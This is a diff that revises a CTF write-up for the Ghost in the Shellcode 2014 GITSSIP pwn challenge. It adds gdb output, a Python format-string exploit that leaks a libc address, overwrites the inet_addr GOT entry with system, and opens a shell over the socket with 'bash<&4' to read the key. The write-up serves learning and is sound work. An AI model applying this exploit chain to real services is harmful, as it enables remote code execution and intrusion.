@@ -1,4 +1,4 @@
-**I'm a noob trying to get better with re and pwn. I wrote this write-up just not to loose the knowledge I got and share with 													u, folks \\|_|/**
+**I'm a noob trying to get better with re and pwn. I wrote this write-up just not to lose the knowledge I got and share it with u, folks \\|_|/**
 
 I didn't manage to play Ghostinshellcode teaser, though still I decided to pwn this task. Let's start!
 
@@ -153,25 +153,39 @@ Let's choose a function which got.plt entry shall be rewritten:
 Digging command handlers I stumbled upon an **inet_addr** call in INVITE handler. Spent five minutes to realize the format of messages:
 
 ```bash
+(gdb) br inet_addr
+Breakpoint 1 at 0x4019e0
+(gdb) r
+```
+
+```bash
 dog@ubuntu:~/ctf/ghostinshelcode2014$ nc localhost 5060
-REGISTER foo GITSSIP/0.1
+REGISTER x GITSSIP/0.1
 To: x
 From: x
 Expires: 0
 Common Name: x
 Contact: x
 
-INVITE sip:123@wecancontrolit GITSSIP/0.1
+INVITE sip:x@wecancontrolit GITSSIP/0.1
 To: x
 From: x
 Via: x
 Contact: x
 Allow: x
-GITSSIP/0.1 200 OK
 
+GITSSIP/0.1 200 OK
 GITSSIP/0.1 500 Malformed Header
 ```
-Yeah, we got error 500, but the tricky thing is: **inet_addr** was called with 'wecancontrolit' string. So, we've chosen our victim!
+
+```bash
+Breakpoint 1, inet_addr (cp=0x7fff5ea65ce1 "wecancontrolit") at inet_addr.c:93
+93	inet_addr.c: No such file or directory.
+(gdb) x/s $rdi
+0x7fff5ea65ce1:	"wecancontrolit"
+```
+
+Yeah, we got error 500, but the tricky thing is: **inet_addr** was called with 'wecancontrolit' string. So, we've chosen our victim (@system takes string through @rdi too).
 
 ####Let's write an exploit!
 Firstly we need to leak the address of @__libc_start_main+245. Using the stack dump, we can calculate, that using 60th parameter of format string will give us desired address:
@@ -184,12 +198,12 @@ port = 5060
 s.connect((address, port))
 
 #leak @__libc_start_main+245 address
-s.sendall('''REGISTER foo GITSSIP/0.1
+s.sendall('''REGISTER x GITSSIP/0.1
 To: ''' + '%60$p' + '''
-From: a
+From: x
 Expires: 0
-Common Name: b
-Contact: a
+Common Name: x
+Contact: x
 
 DIRECTORY * GITSSIP/0.1
 Search: *
@@ -224,12 +238,48 @@ for off, byte in enumerate(u64(systemAddr)):
 
 time.sleep(0.2)
 
-data = s.recv(1024)
-print(data)
+s.recv(1024)
 ```
 
-It's time to explain this magic - we rewrite the address byte by byte using **%u** flag (used to determine value to be written), **Direct Parameter Access** (to make asprintf to use 9th parameter in stack as a pointer for **$hhn**) and **Short Writes** (not to touch the memory around @inet_addr entry). These ugly ``.replace('\t', '')`` are used because indent we use while declaring a proc is concluded to string itself.
+It's time to explain this magic - we rewrite the address byte by byte using **%u** flag (used to determine value to be written), **Direct Parameter Access** (to make asprintf to use 9th parameter in stack as a pointer for **$hhn**) and **Short Writes** (not to touch the memory around @inet_addr entry). These ugly ``.replace('\t', '')`` are used because indent we use while declaring a proc is included at string itself.
 
 **Q**: How did we understood we need 9th parameter? Why 'Common Name' starts with a bunch of 'x'es?
 
-**A**: It is done experimentally: you place an 'AAAAAAAA' string to 'Common Name' and use a sequence of '%08x.' flags to print the stack. You won't have a clear "0x4141414141414141" value, so just play with padding! After several iterations you will understand which parameter to use and how long padding should be.
+**A**: It is done experimentally: you place an 'AAAAAAAA' string to 'Common Name' and use a sequence of '%08x.' flags to print the stack. You will hardly have a solid "0x4141414141414141" value, so just play with padding! After several iterations you will understand which parameter to use and how long padding should be.
+
+**Q**: What the heck is that 0xe9 constant? How did we get it?
+
+**A**: Experimentally! Just put a breakpoint at @exit like ``br exit``, launch exploit and compare what was written at ``x/xg 0x6130A8``with the value supposed to be written. Every byte will differ by a constant :)
+
+**Q**: Why do you use SEARCH command after each REGISTER? We can 'stack' REGISTER and then issue only one SEARCH to trigger format string bomb!
+
+**A**: That's right! But I had issues with such approach - connection closed -_- So i decided to go dirty way.
+
+Now we can call @system with almost arbitrary string (there should be no spaces). How this string should look like?
+
+More magic!
+```python
+trigger vuln
+s.sendall('''INVITE sip:x@bash<&4 GITSSIP/0.1
+To: x
+Via: x
+From: x
+Contact: x
+Allow: x
+
+exec 0>&4 1>&4
+cat key
+''')
+
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+```
+
+**Q**: What do these ``bash<&4``, ``exec 0>&4 1>&4`` do?
+
+**A**: The former is used to 'tie' bash communication channel to 4'th file descriptor. The latter redirects **stdout** (1) and **stdin**(0) to 4-th fd.
+
+**Q**: Why to use telnet? 
+
+**A**: Just4lulz - so we can send arbitrary command to remote shell :)
